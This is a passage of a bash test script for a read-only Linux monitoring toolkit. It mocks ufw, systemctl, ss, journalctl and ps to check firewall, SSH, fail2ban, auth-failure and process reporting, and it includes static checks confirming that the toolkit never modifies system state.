#!/usr/bin/env bash
scenario="${SECURITY_MOCK_SCENARIO:-normal}"
case "$scenario" in
    ufwinactive)
        printf 'Status: inactive\n'
        ;;
    ufwdenied)
        printf 'ERROR: You need to be root to run this script\n' >&2
        exit 1
        ;;
    *)
        printf 'Status: active\n'
        printf 'Logging: on (low)\n'
        printf 'Default: deny (incoming), allow (outgoing), disabled (routed)\n'
        printf 'New profiles: skip\n'
        ;;
esac
MOCKEOF

cat >"${MOCK_DIR}/systemctl" <<'MOCKEOF'
#!/usr/bin/env bash
# Scripted `systemctl` for security-info tests. Behavior selected by
# $SECURITY_MOCK_SCENARIO. Read-only responses only - never changes state.
scenario="${SECURITY_MOCK_SCENARIO:-normal}"

case "$1" in
    --version)
        printf 'systemd 255 (255.4-1ubuntu8.17)\n'
        ;;
    list-units)
        if [[ "$*" == *"--failed"* ]]; then
            if [[ "$scenario" == "failedservices" ]]; then
                printf 'broken-a.service loaded failed failed A broken service\n'
                printf 'broken-b.service loaded failed failed Another broken service\n'
            fi
        fi
        ;;
    show)
        unit="$2"
        case "$unit" in
            ssh.service)
                if [[ "$scenario" == "sshdonly" || "$scenario" == "sshabsent" ]]; then
                    printf 'LoadState=not-found\nActiveState=inactive\n'
                else
                    printf 'LoadState=loaded\nActiveState=active\n'
                fi
                ;;
            sshd.service)
                if [[ "$scenario" == "sshdonly" ]]; then
                    printf 'LoadState=loaded\nActiveState=active\n'
                else
                    printf 'LoadState=not-found\nActiveState=inactive\n'
                fi
                ;;
            fail2ban.service)
                case "$scenario" in
                    fail2banactive) printf 'LoadState=loaded\nActiveState=active\n' ;;
                    fail2baninactive) printf 'LoadState=loaded\nActiveState=inactive\n' ;;
                    *) printf 'LoadState=not-found\nActiveState=inactive\n' ;;
                esac
                ;;
            *)
                printf 'LoadState=not-found\nActiveState=inactive\n'
                ;;
        esac
        ;;
esac
exit 0
MOCKEOF

cat >"${MOCK_DIR}/ss" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${SECURITY_MOCK_SCENARIO:-normal}"
case "$*" in
    *-tlnp*)
        case "$scenario" in
            emptylisteners) : ;;
            malformedlisteners)
                printf 'LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))\n'
                printf 'LISTEN weird-line-missing-fields\n'
                ;;
            sshcustomport)
                printf 'LISTEN 0 128 0.0.0.0:2222 0.0.0.0:* users:(("sshd",pid=1,fd=3))\n'
                printf 'LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*\n'
                ;;
            sshnotlistening)
                printf 'LISTEN 0 128 0.0.0.0:80 0.0.0.0:*\n'
                printf 'LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*\n'
                ;;
            *)
                printf 'LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))\n'
                printf 'LISTEN 0 128 0.0.0.0:80 0.0.0.0:*\n'
                printf 'LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*\n'
                ;;
        esac
        ;;
    *-tan*)
        : # not used by security-info; no connection-state data needed
        ;;
esac
exit 0
MOCKEOF

cat >"${MOCK_DIR}/journalctl" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${SECURITY_MOCK_SCENARIO:-normal}"
case "$scenario" in
    authfailures)
        printf 'Failed password for invalid user test from 10.0.0.1\n'
        printf 'Failed password for root from 10.0.0.2\n'
        printf 'pam_unix(su:auth): authentication failure\n'
        ;;
    authunavailable)
        exit 1
        ;;
    journalctltimeout)
        sleep 30
        ;;
    *)
        : # no matching failures
        ;;
esac
exit 0
MOCKEOF

chmod +x "${MOCK_DIR}/ufw" "${MOCK_DIR}/systemctl" "${MOCK_DIR}/ss" "${MOCK_DIR}/journalctl"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if SECURITY_MOCK_SCENARIO=normal PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_normal.out 2>/tmp/toolkit_test_security_normal.err; then
    if grep -qE '^Status +active$' /tmp/toolkit_test_security_normal.out && \
       grep -qE '^Default In +deny$' /tmp/toolkit_test_security_normal.out && \
       grep -qE '^Default Out +allow$' /tmp/toolkit_test_security_normal.out && \
       grep -qE '^Logging +low$' /tmp/toolkit_test_security_normal.out; then
        ok "security-info parses UFW status/default-policy/logging correctly (mocked active)"
    else
        bad "security-info did not correctly parse mocked active UFW status"
    fi
    if grep -A5 '^SSH$' /tmp/toolkit_test_security_normal.out | grep -qE '^Service +ssh\.service$' && \
       grep -A5 '^SSH$' /tmp/toolkit_test_security_normal.out | grep -qE '^Port +22$' && \
       grep -A5 '^SSH$' /tmp/toolkit_test_security_normal.out | grep -qE '^Listening +yes$'; then
        ok "security-info detects ssh.service, its real listening port, and Listening: yes (mocked)"
    else
        bad "security-info SSH section did not match expected fields for the normal scenario"
    fi
    if grep -A3 '^FAILED SERVICES$' /tmp/toolkit_test_security_normal.out | grep -qE '^Count +0$'; then
        ok "security-info reports 0 failed services and raises no alert (mocked)"
    else
        bad "security-info did not report 0 failed services correctly"
    fi
    if grep -A3 '^AUTHENTICATION$' /tmp/toolkit_test_security_normal.out | grep -qE '^Recent failures \(24h\) +0$'; then
        ok "security-info reports 0 recent auth failures with an explicit 24h window (mocked)"
    else
        bad "security-info did not report 0 recent auth failures correctly"
    fi
    if grep -A3 '^FAIL2BAN$' /tmp/toolkit_test_security_normal.out | grep -qE '^Installed +no$'; then
        ok "security-info reports fail2ban as not installed (mocked)"
    else
        bad "security-info did not report fail2ban as not installed"
    fi
    if grep -qE '^0\.0\.0\.0:22 +sshd$' /tmp/toolkit_test_security_normal.out && \
       grep -qE '^0\.0\.0\.0:80 +-$' /tmp/toolkit_test_security_normal.out; then
        ok "security-info PUBLIC LISTENERS table parses bind/port/process correctly (mocked)"
    else
        bad "security-info PUBLIC LISTENERS table did not match expected rows"
    fi
    if grep -qE '^Public listeners +2$' /tmp/toolkit_test_security_normal.out && \
       grep -qE '^Local-only listeners +1$' /tmp/toolkit_test_security_normal.out; then
        ok "security-info computes correct public/local listener counts (mocked)"
    else
        bad "security-info listener counts did not match expected values"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_normal.out | grep -q 'Security healthy'; then
        ok "security-info raises no alert for a fully healthy mocked system"
    else
        bad "security-info raised an unexpected alert for a healthy mocked system"
    fi
else
    bad "security-info failed on the normal mocked scenario: $(cat /tmp/toolkit_test_security_normal.err)"
fi

if SECURITY_MOCK_SCENARIO=ufwinactive PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_ufwinactive.out 2>/tmp/toolkit_test_security_ufwinactive.err; then
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_ufwinactive.out | grep -qi 'UFW is inactive'; then
        ok "security-info alerts when UFW is inactive (mocked)"
    else
        bad "security-info did not alert on an inactive UFW"
    fi
else
    bad "security-info failed on the ufwinactive mocked scenario: $(cat /tmp/toolkit_test_security_ufwinactive.err)"
fi

if SECURITY_MOCK_SCENARIO=ufwdenied PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_ufwdenied.out 2>/tmp/toolkit_test_security_ufwdenied.err; then
    if grep -A2 '^UFW$' /tmp/toolkit_test_security_ufwdenied.out | grep -qi 'N/A'; then
        ok "security-info reports UFW N/A on permission denied without crashing (mocked)"
    else
        bad "security-info did not report N/A for a permission-denied UFW status"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_ufwdenied.out | grep -qi 'ufw'; then
        bad "security-info incorrectly raised a UFW alert for a permission-denied (not confirmed inactive) status"
    else
        ok "security-info does not alert merely because UFW status was inaccessible"
    fi
else
    bad "security-info failed on the ufwdenied mocked scenario: $(cat /tmp/toolkit_test_security_ufwdenied.err)"
fi

MOCK_DIR_NOUFW="$(mktemp -d)"
for f in systemctl ss journalctl; do
    cp "${MOCK_DIR}/${f}" "${MOCK_DIR_NOUFW}/${f}"
done
# ufw only lives in /usr/sbin (and its /sbin symlink) on this host, and no
# core tool we depend on lives there, so excluding those two directories
# reliably hides the real ufw binary without breaking anything else.
NOUFW_PATH="${MOCK_DIR_NOUFW}"
IFS=':' read -ra PATH_DIRS <<<"$PATH"
for d in "${PATH_DIRS[@]}"; do
    [[ "$d" == "/usr/sbin" || "$d" == "/sbin" ]] && continue
    NOUFW_PATH="${NOUFW_PATH}:${d}"
done
if PATH="$NOUFW_PATH" command -v ufw >/dev/null 2>&1; then
    ok "security-info UFW-absent test skipped (ufw is reachable outside /usr/sbin,/sbin on this host)"
elif PATH="$NOUFW_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_noufw.out 2>/tmp/toolkit_test_security_noufw.err; then
    if grep -A2 '^UFW$' /tmp/toolkit_test_security_noufw.out | grep -qi 'not installed'; then
        ok "security-info reports UFW as not installed when the ufw binary is absent"
    else
        bad "security-info did not report UFW as not installed when absent"
    fi
else
    bad "security-info failed when ufw was entirely absent: $(cat /tmp/toolkit_test_security_noufw.err)"
fi
rm -rf "$MOCK_DIR_NOUFW"

if SECURITY_MOCK_SCENARIO=sshdonly PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_sshdonly.out 2>/tmp/toolkit_test_security_sshdonly.err; then
    if grep -A5 '^SSH$' /tmp/toolkit_test_security_sshdonly.out | grep -qE '^Service +sshd\.service$'; then
        ok "security-info falls back to sshd.service when ssh.service doesn't exist (mocked)"
    else
        bad "security-info did not fall back to sshd.service correctly"
    fi
else
    bad "security-info failed on the sshdonly mocked scenario: $(cat /tmp/toolkit_test_security_sshdonly.err)"
fi

if SECURITY_MOCK_SCENARIO=sshabsent PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_sshabsent.out 2>/tmp/toolkit_test_security_sshabsent.err; then
    if grep -A2 '^SSH$' /tmp/toolkit_test_security_sshabsent.out | grep -q 'N/A'; then
        ok "security-info reports SSH N/A when neither ssh.service nor sshd.service exist (mocked)"
    else
        bad "security-info did not report SSH N/A when absent"
    fi
else
    bad "security-info failed on the sshabsent mocked scenario: $(cat /tmp/toolkit_test_security_sshabsent.err)"
fi

if SECURITY_MOCK_SCENARIO=sshcustomport PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_sshcustom.out 2>/tmp/toolkit_test_security_sshcustom.err; then
    if grep -A5 '^SSH$' /tmp/toolkit_test_security_sshcustom.out | grep -qE '^Port +2222$' && \
       grep -A5 '^SSH$' /tmp/toolkit_test_security_sshcustom.out | grep -qE '^Listening +yes$'; then
        ok "security-info detects a custom SSH port from the live socket rather than assuming 22 (mocked)"
    else
        bad "security-info did not detect the custom SSH port correctly"
    fi
else
    bad "security-info failed on the sshcustomport mocked scenario: $(cat /tmp/toolkit_test_security_sshcustom.err)"
fi

if SECURITY_MOCK_SCENARIO=sshnotlistening PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_sshnotlistening.out 2>/tmp/toolkit_test_security_sshnotlistening.err; then
    if grep -A5 '^SSH$' /tmp/toolkit_test_security_sshnotlistening.out | grep -qE '^Listening +no$'; then
        ok "security-info reports Listening: no when the configured SSH port has no active socket (mocked)"
    else
        bad "security-info did not report Listening: no correctly"
    fi
else
    bad "security-info failed on the sshnotlistening mocked scenario: $(cat /tmp/toolkit_test_security_sshnotlistening.err)"
fi

if SECURITY_MOCK_SCENARIO=failedservices PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_failedsvc.out 2>/tmp/toolkit_test_security_failedsvc.err; then
    if grep -A3 '^FAILED SERVICES$' /tmp/toolkit_test_security_failedsvc.out | grep -qE '^Count +2$'; then
        ok "security-info reports Count 2 for two mocked failed systemd services"
    else
        bad "security-info did not report the failed service count correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_failedsvc.out | grep -qi '2 failed systemd service'; then
        ok "security-info alerts on failed systemd services (reusing services.sh helpers)"
    else
        bad "security-info did not alert on failed systemd services"
    fi
else
    bad "security-info failed on the failedservices mocked scenario: $(cat /tmp/toolkit_test_security_failedsvc.err)"
fi

if SECURITY_MOCK_SCENARIO=authfailures PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_authfail.out 2>/tmp/toolkit_test_security_authfail.err; then
    if grep -A3 '^AUTHENTICATION$' /tmp/toolkit_test_security_authfail.out | grep -qE '^Recent failures \(24h\) +3$'; then
        ok "security-info counts 3 recent auth failures within the stated 24h window (mocked)"
    else
        bad "security-info did not count the mocked auth failures correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_authfail.out | grep -qi 'authentication failures detected'; then
        ok "security-info alerts when authentication failures are detected"
    else
        bad "security-info did not alert on detected authentication failures"
    fi
else
    bad "security-info failed on the authfailures mocked scenario: $(cat /tmp/toolkit_test_security_authfail.err)"
fi

if SECURITY_MOCK_SCENARIO=authunavailable PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_authunavail.out 2>/tmp/toolkit_test_security_authunavail.err; then
    if grep -A3 '^AUTHENTICATION$' /tmp/toolkit_test_security_authunavail.out | grep -qE '^Recent failures \(24h\) +N/A$'; then
        ok "security-info reports N/A (not a false zero) when the auth-failure source is unavailable"
    else
        bad "security-info did not report N/A when journalctl failed for authentication data"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_authunavail.out | grep -qi 'authentication'; then
        bad "security-info incorrectly alerted on authentication data it could not actually read"
    else
        ok "security-info does not alert when authentication data is simply unavailable"
    fi
else
    bad "security-info failed on the authunavailable mocked scenario: $(cat /tmp/toolkit_test_security_authunavail.err)"
fi

start_ts=$(date +%s)
if SECURITY_MOCK_SCENARIO=journalctltimeout PATH="$MOCK_PATH" timeout 15 "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_jctimeout.out 2>/tmp/toolkit_test_security_jctimeout.err; then
    end_ts=$(date +%s)
    elapsed=$(( end_ts - start_ts ))
    if [[ "$elapsed" -lt 10 ]] && grep -A3 '^AUTHENTICATION$' /tmp/toolkit_test_security_jctimeout.out | grep -qE '^Recent failures \(24h\) +N/A$'; then
        ok "security-info bounds a hanging journalctl with its internal timeout (finished in ${elapsed}s, reported N/A)"
    else
        bad "security-info did not bound the hanging journalctl correctly (elapsed=${elapsed}s)"
    fi
else
    bad "security-info did not complete within the outer 15s safety timeout when journalctl hung"
fi

if SECURITY_MOCK_SCENARIO=fail2banactive PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_f2ba.out 2>/tmp/toolkit_test_security_f2ba.err; then
    if grep -A3 '^FAIL2BAN$' /tmp/toolkit_test_security_f2ba.out | grep -qE '^Installed +yes$' && \
       grep -A3 '^FAIL2BAN$' /tmp/toolkit_test_security_f2ba.out | grep -qE '^Status +active$'; then
        ok "security-info reports fail2ban installed and active (mocked)"
    else
        bad "security-info did not report fail2ban active status correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_f2ba.out | grep -qi 'fail2ban'; then
        bad "security-info incorrectly alerted on an active fail2ban installation"
    else
        ok "security-info raises no alert when fail2ban is installed and active"
    fi
else
    bad "security-info failed on the fail2banactive mocked scenario: $(cat /tmp/toolkit_test_security_f2ba.err)"
fi

if SECURITY_MOCK_SCENARIO=fail2baninactive PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_f2bi.out 2>/tmp/toolkit_test_security_f2bi.err; then
    if grep -A3 '^FAIL2BAN$' /tmp/toolkit_test_security_f2bi.out | grep -qE '^Installed +yes$' && \
       grep -A3 '^FAIL2BAN$' /tmp/toolkit_test_security_f2bi.out | grep -qE '^Status +inactive$'; then
        ok "security-info reports fail2ban installed but inactive (mocked)"
    else
        bad "security-info did not report fail2ban inactive status correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_security_f2bi.out | grep -qi 'fail2ban is installed but not active'; then
        ok "security-info alerts when fail2ban is installed but not active"
    else
        bad "security-info did not alert on an installed-but-inactive fail2ban"
    fi
else
    bad "security-info failed on the fail2baninactive mocked scenario: $(cat /tmp/toolkit_test_security_f2bi.err)"
fi

if SECURITY_MOCK_SCENARIO=emptylisteners PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_emptylisten.out 2>/tmp/toolkit_test_security_emptylisten.err; then
    if grep -A2 '^PUBLIC LISTENERS$' /tmp/toolkit_test_security_emptylisten.out | grep -q 'N/A'; then
        ok "security-info handles empty listener output without crashing"
    else
        bad "security-info did not gracefully handle empty listener output"
    fi
else
    bad "security-info crashed on empty listener output: $(cat /tmp/toolkit_test_security_emptylisten.err)"
fi

if SECURITY_MOCK_SCENARIO=malformedlisteners PATH="$MOCK_PATH" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_malformedlisten.out 2>/tmp/toolkit_test_security_malformedlisten.err; then
    ok "security-info tolerates a malformed listener line without crashing"
    if grep -qE '^0\.0\.0\.0:22 +sshd$' /tmp/toolkit_test_security_malformedlisten.out; then
        ok "security-info still shows the well-formed listener alongside a malformed one"
    else
        bad "security-info lost the well-formed listener when a malformed line was present"
    fi
else
    bad "security-info crashed on malformed listener output: $(cat /tmp/toolkit_test_security_malformedlisten.err)"
fi

rm -rf "$MOCK_DIR"

echo "== security-info handles systemd unavailable =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/systemctl"
chmod +x "${STUB_DIR}/systemctl"
if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/security-info" >/tmp/toolkit_test_security_nosystemd.out 2>/tmp/toolkit_test_security_nosystemd.err; then
    if grep -A3 '^FAILED SERVICES$' /tmp/toolkit_test_security_nosystemd.out | grep -qE '^Count +N/A$'; then
        ok "security-info reports Failed Services Count: N/A when systemd is unavailable"
    else
        bad "security-info did not report N/A for failed services when systemd was unavailable"
    fi
    if grep -A2 '^SSH$' /tmp/toolkit_test_security_nosystemd.out | grep -q 'N/A'; then
        ok "security-info reports SSH N/A when systemd/systemctl is unavailable"
    else
        bad "security-info did not report SSH N/A when systemctl was unusable"
    fi
else
    bad "security-info failed (nonzero exit) when systemctl was entirely unusable: $(cat /tmp/toolkit_test_security_nosystemd.err)"
fi
rm -rf "$STUB_DIR"

echo "== security-info: no state-changing/destructive commands present (static check) =="
if ! grep -nE 'ufw +(enable|disable|allow|deny|delete|reset)\b' \
    "${TOOLKIT_DIR}/lib/security.sh" "${BIN_DIR}/security-info"; then
    ok "security.sh / security-info contain no state-changing ufw invocations"
else
    bad "security.sh / security-info appear to invoke a state-changing ufw command"
fi
if ! grep -nE '\b(iptables|nft)\b +.*(-A|-D|-I|-F|-X|-P|--flush|--policy|add|delete|insert)' \
    "${TOOLKIT_DIR}/lib/security.sh" "${BIN_DIR}/security-info"; then
    ok "security.sh / security-info contain no iptables/nft state-changing invocations"
else
    bad "security.sh / security-info appear to invoke a state-changing iptables/nft command"
fi
if ! grep -nE 'fail2ban-client +(set|reload)\b' \
    "${TOOLKIT_DIR}/lib/security.sh" "${BIN_DIR}/security-info"; then
    ok "security.sh / security-info contain no fail2ban-client state-changing invocations"
else
    bad "security.sh / security-info appear to invoke a state-changing fail2ban-client command"
fi
if ! grep -nE 'systemctl +(start|stop|restart|reload|enable|disable|mask|unmask)\b|(^|[^A-Za-z0-9_])service +[A-Za-z0-9._-]+ +(start|stop|restart|reload)\b' \
    "${TOOLKIT_DIR}/lib/security.sh" "${BIN_DIR}/security-info"; then
    ok "security.sh / security-info contain no systemctl/service state-changing invocations"
else
    bad "security.sh / security-info appear to invoke a state-changing systemctl/service command"
fi
if ! grep -nE '(^|[^A-Za-z0-9_.])(passwd|usermod|groupmod|chmod|chown|rm|truncate|apt|apt-get)\b[^=]' \
    "${TOOLKIT_DIR}/lib/security.sh" "${BIN_DIR}/security-info"; then
    ok "security.sh / security-info contain no passwd/usermod/chmod/chown/rm/truncate/apt invocations"
else
    bad "security.sh / security-info appear to invoke a filesystem/package/account-modifying command"
fi

echo "== security-info reads real data without modifying it =="
CANARY_BEFORE="$(stat -c '%Y' /etc/ssh/sshd_config 2>/dev/null)"
"${BIN_DIR}/security-info" >/dev/null 2>&1 || true
CANARY_AFTER="$(stat -c '%Y' /etc/ssh/sshd_config 2>/dev/null)"
if [[ "$CANARY_BEFORE" == "$CANARY_AFTER" ]]; then
    ok "running security-info did not change /etc/ssh/sshd_config's mtime"
else
    bad "/etc/ssh/sshd_config's mtime changed after running security-info ($CANARY_BEFORE -> $CANARY_AFTER)"
fi

echo "== process-info runs successfully (live host) =="
if "${BIN_DIR}/process-info" >/tmp/toolkit_test_process.out 2>/tmp/toolkit_test_process.err; then
    ok "process-info exits 0"
    if grep -q '^PROCESS OVERVIEW$' /tmp/toolkit_test_process.out && grep -q '^TOP CPU$' /tmp/toolkit_test_process.out && \
       grep -q '^SYSTEM LOAD$' /tmp/toolkit_test_process.out; then
        ok "process-info prints PROCESS OVERVIEW, TOP CPU and SYSTEM LOAD sections"
    else
        bad "process-info output is missing expected sections"
    fi
else
    bad "process-info exited non-zero: $(cat /tmp/toolkit_test_process.err)"
fi

echo "== process.sh pure-function tests (synthetic snapshot data) =="
FIXTURE_NORMAL='100|1|alice|75.5|10.0|R|python3 worker.py --queue high
101|1|bob|5.0|50.0|S|java -jar app.jar
102|1|root|0.0|0.0|Z|<defunct>
103|1|carol|95.0|2.0|S|stress --cpu 1
104|1|dave|1.0|92.0|S|memhog
105|1|eve|0.0|0.1|T|paused-tool'

counts="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    count_process_states "$1"
' _ "$FIXTURE_NORMAL")"
if [[ "$counts" == "6 1 3 1 1" ]]; then
    ok "count_process_states correctly counts total/running/sleeping/stopped/zombie from a mixed snapshot"
else
    bad "count_process_states mismatch: expected '6 1 3 1 1', got '$counts'"
fi

empty_counts="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    count_process_states ""
')"
if [[ "$empty_counts" == "0 0 0 0 0" ]]; then
    ok "count_process_states handles an empty snapshot without crashing"
else
    bad "count_process_states did not handle an empty snapshot correctly: '$empty_counts'"
fi

top_cpu="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    top_n_by_field "$1" 4 3
' _ "$FIXTURE_NORMAL")"
top_cpu_users="$(awk -F'|' '{print $3}' <<<"$top_cpu" | tr '\n' ',')"
if [[ "$top_cpu_users" == "carol,alice,bob," ]]; then
    ok "top_n_by_field sorts by CPU descending correctly (carol > alice > bob)"
else
    bad "top_n_by_field CPU ordering mismatch: got '$top_cpu_users'"
fi
if grep -qF 'python3 worker.py --queue high' <<<"$top_cpu"; then
    ok "top_n_by_field preserves a command containing spaces intact as one field"
else
    bad "top_n_by_field lost or mangled a command containing spaces"
fi

top_mem="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    top_n_by_field "$1" 5 3
' _ "$FIXTURE_NORMAL")"
top_mem_users="$(awk -F'|' '{print $3}' <<<"$top_mem" | tr '\n' ',')"
if [[ "$top_mem_users" == "dave,bob,alice," ]]; then
    ok "top_n_by_field sorts by memory descending correctly (dave > bob > alice)"
else
    bad "top_n_by_field memory ordering mismatch: got '$top_mem_users'"
fi

cpu_threshold_count="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    count_above_threshold "$1" 4 90
' _ "$FIXTURE_NORMAL")"
mem_threshold_count="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    count_above_threshold "$1" 5 90
' _ "$FIXTURE_NORMAL")"
if [[ "$cpu_threshold_count" == "1" && "$mem_threshold_count" == "1" ]]; then
    ok "count_above_threshold correctly identifies exactly one process over 90% CPU and one over 90% memory"
else
    bad "count_above_threshold mismatch: cpu=$cpu_threshold_count mem=$mem_threshold_count (expected 1 and 1)"
fi

FIXTURE_MALFORMED='200|1||5.0|1.0|S|missing-user-field
201|1|greg||1.0|S|missing-cpu-field
202|1|hank|1.0||S|missing-mem-field
203|1|ivan|abc|xyz|S|non-numeric-cpu-and-mem'
malformed_threshold="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    count_above_threshold "$1" 4 90
' _ "$FIXTURE_MALFORMED")"
malformed_top="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    top_n_by_field "$1" 4 5
' _ "$FIXTURE_MALFORMED")"
if [[ "$malformed_threshold" == "0" ]] && [[ -n "$malformed_top" ]]; then
    ok "missing/non-numeric CPU and memory fields are treated as 0, not crashes or false alerts"
else
    bad "malformed numeric fields were not handled gracefully (threshold=$malformed_threshold)"
fi

load_normal="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    parse_load_average "0.21, 0.23, 0.14"
')"
load_na="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/process.sh"
    parse_load_average "N/A"
')"
if [[ "$load_normal" == "0.21|0.23|0.14" && "$load_na" == "N/A|N/A|N/A" ]]; then
    ok "parse_load_average handles both a normal load string and an unavailable ('N/A') one correctly"
else
    bad "parse_load_average mismatch: normal='$load_normal' na='$load_na'"
fi

echo "== process-info mocked scenarios (ps scripted) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/ps" <<'MOCKEOF'
#!/usr/bin/env bash
# Scripted `ps` for process-info tests. Behavior selected by
# $PROCESS_MOCK_SCENARIO. Also counts its own invocations (if
# $PROCESS_MOCK_COUNTER_FILE is set) to let tests prove process-info takes
# exactly one snapshot rather than spawning one `ps` per process.
scenario="${PROCESS_MOCK_SCENARIO:-normal}"
[[ -n "${PROCESS_MOCK_COUNTER_FILE:-}" ]] && printf 'x\n' >>"$PROCESS_MOCK_COUNTER_FILE"

case "$scenario" in
    empty)
        exit 0
        ;;
    malformedrow)
        printf '100 1 alice 5.0 10.0 S python3 worker.py\n'
        printf '999 1 weirduser\n'
        ;;
    highcpu)
        printf '100 1 alice 95.0 10.0 R stress-test\n'
        printf '101 1 bob 1.0 2.0 S normal-proc\n'
        ;;
    highmem)
        printf '100 1 alice 1.0 95.0 S memhog\n'
        printf '101 1 bob 1.0 2.0 S normal-proc\n'
        ;;
    zombie)
        printf '100 1 alice 0.0 0.0 Z defunct-proc\n'
        printf '101 1 bob 1.0 2.0 S normal-proc\n'
        ;;
    manyprocs)
        for i in $(seq 1 10); do
            printf '%d 1 user%d %d.0 1.0 S proc-%d\n' "$((100 + i))" "$i" "$i" "$i"
        done
        ;;
    *)
        printf '100 1 alice 5.0 10.0 S python3 worker.py --queue high\n'
        printf '101 1 bob 1.0 2.0 S java -jar app.jar\n'
        printf '102 1 root 0.0 0.5 R systemd-journald\n'
        ;;
esac
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/ps"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if PROCESS_MOCK_SCENARIO=normal PATH="$MOCK_PATH" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_normal.out 2>/tmp/toolkit_test_process_normal.err; then
    if grep -qE '^Total processes +3$' /tmp/toolkit_test_process_normal.out; then
        ok "process-info counts total processes correctly from a mocked snapshot"
    else
        bad "process-info did not report the correct total process count"
    fi
    if grep -qE '^Running +1$' /tmp/toolkit_test_process_normal.out && grep -qE '^Sleeping +2$' /tmp/toolkit_test_process_normal.out; then
        ok "process-info counts running/sleeping states correctly (mocked)"
    else
        bad "process-info did not report running/sleeping counts correctly"
    fi
    if grep -qF 'java -jar app.jar' /tmp/toolkit_test_process_normal.out; then
        ok "process-info displays a command line intact in its tables (mocked)"
    else
        bad "process-info did not display the mocked command line correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_process_normal.out | grep -q 'No process anomalies'; then
        ok "process-info raises no alert for a healthy mocked process set"
    else
        bad "process-info raised an unexpected alert for a healthy mocked process set"
    fi
else
    bad "process-info failed on the normal mocked scenario: $(cat /tmp/toolkit_test_process_normal.err)"
fi

if PROCESS_MOCK_SCENARIO=empty PATH="$MOCK_PATH" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_empty.out 2>/tmp/toolkit_test_process_empty.err; then
    if grep -A2 '^PROCESS OVERVIEW$' /tmp/toolkit_test_process_empty.out | grep -q 'N/A'; then
        ok "process-info handles an empty process list without crashing (reports N/A)"
    else
        bad "process-info did not gracefully handle an empty process list"
    fi
else
    bad "process-info crashed on an empty process list: $(cat /tmp/toolkit_test_process_empty.err)"
fi

if PROCESS_MOCK_SCENARIO=malformedrow PATH="$MOCK_PATH" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_malformed.out 2>/tmp/toolkit_test_process_malformed.err; then
    ok "process-info tolerates a malformed/short ps row without crashing"
    if grep -qE '^Total processes +2$' /tmp/toolkit_test_process_malformed.out; then
        ok "process-info still counts a malformed row toward the total"
    else
        bad "process-info did not count the malformed row toward the total correctly"
    fi
else
    bad "process-info crashed on a malformed ps row: $(cat /tmp/toolkit_test_process_malformed.err)"
fi

if PROCESS_MOCK_SCENARIO=highcpu PATH="$MOCK_PATH" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_highcpu.out 2>/tmp/toolkit_test_process_highcpu.err; then
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_process_highcpu.out | grep -qE '1 process\(es\) above 90% CPU'; then
